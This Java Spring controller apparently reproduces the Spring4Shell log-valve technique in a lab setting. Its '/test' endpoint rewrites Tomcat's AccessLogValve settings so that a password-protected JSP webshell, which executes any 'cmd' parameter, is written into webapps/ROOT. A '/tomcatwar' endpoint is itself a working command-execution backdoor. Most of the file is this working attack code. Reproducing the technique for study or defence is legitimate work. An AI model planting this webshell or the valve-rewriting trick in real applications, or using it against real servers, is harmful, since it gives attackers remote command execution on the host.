package com.example.controller;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.catalina.valves.AccessLogValve;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;

import com.example.form.SampleForm;

@Controller
public class SampleController {

	public static void main(String[] args) {
		try {
			InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();
			int a;
			byte[] b = new byte[2048];
			while ((a = in.read(b)) != -1) {
				System.out.println(new String(b));
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@RequestMapping(value = { "", "/" })
	public void hello(@ModelAttribute("SampleForm") SampleForm sampleForm, HttpServletResponse response) {
		try {
			PrintWriter writer = response.getWriter();
			writer.println("hello");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@RequestMapping(value = { "/test" })
	public void test(HttpServletResponse response) {
		ParallelWebappClassLoader parallelWebappClassLoader = (ParallelWebappClassLoader) this.getClass().getModule().getClassLoader();
		AccessLogValve accessLogValve = (AccessLogValve) parallelWebappClassLoader.getResources().getContext().getParent().getPipeline().getFirst();
		accessLogValve.setDirectory("webapps/ROOT");
		accessLogValve.setPrefix("tomcatwar");
		accessLogValve.setSuffix(".jsp");
		accessLogValve.setPattern("if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ response.getWriter().println(new String(b)); } }");
		accessLogValve.setFileDateFormat(null);
		try {
			response.getWriter().println(accessLogValve.getPrefix());
			response.getWriter().println(accessLogValve.getSuffix());
			response.getWriter().println(accessLogValve.getDirectory());
			response.getWriter().println(accessLogValve.getPattern());
			response.getWriter().println(accessLogValve.getFileDateFormat());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@RequestMapping(value = { "/reset" })
	public void reset(HttpServletResponse response) {
		ParallelWebappClassLoader parallelWebappClassLoader = (ParallelWebappClassLoader) this.getClass().getModule().getClassLoader();
		AccessLogValve accessLogValve = (AccessLogValve) parallelWebappClassLoader.getResources().getContext().getParent().getPipeline().getFirst();
		accessLogValve.setDirectory("logs");
		accessLogValve.setPrefix("localhost_access_log");
		accessLogValve.setSuffix(".txt");
		accessLogValve.setPattern("%h %l %u %t %t %s %b");
		accessLogValve.setFileDateFormat(".yyyy-MM-dd");
		try {
			response.getWriter().println(accessLogValve.getPrefix());
			response.getWriter().println(accessLogValve.getSuffix());
			response.getWriter().println(accessLogValve.getDirectory());
			response.getWriter().println(accessLogValve.getPattern());
			response.getWriter().println(accessLogValve.getFileDateFormat());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@RequestMapping(value = { "/tomcatwar" })
	public void tomcatwar(HttpServletRequest request, HttpServletResponse response) {
		try {
			if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ response.getWriter().println(new String(b)); } }
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
